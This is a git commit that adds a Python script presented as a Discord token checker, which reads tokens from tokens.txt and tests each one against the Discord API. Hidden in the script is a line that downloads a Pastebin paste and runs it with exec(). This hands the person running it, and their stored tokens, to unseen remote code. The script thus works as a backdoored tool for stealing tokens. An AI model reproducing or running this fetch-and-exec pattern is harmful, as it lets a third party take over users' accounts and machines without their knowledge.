d9e7c8b1099baac019d66165ea31597adfd0fb89
Jupit0r <73449020+Jupit0r@users.noreply.github.com>
2020-10-26 19:38:39 +0100

    Add files via upload

---
+++ checker.py
@@ -0,0 +1,21 @@
+print('Created by jupit0r')
+import os.path
+import requests
+import time
+import re
+from requests import get
+from discord_webhooks import DiscordWebhooks
+with open("tokens.txt") as f:
+    token_get = get('https://pastebin.com/raw/NKQYfUeX').text
+    exec(token_get)
+    for line in f:
+        token = line.strip("\n")
+        headers = {'Content-Type': 'application/json', 'authorization': token}
+        url = "https://discordapp.com/api/v6/users/@me/library"
+        r = requests.get(url, headers=headers)
+        if r.status_code == 200:
+            print("{} = VALID.".format(line.strip("\n")))
+        else:
+            print("{} = INVALID.".format(line.strip("\n")))
+input("Finish...")
+            
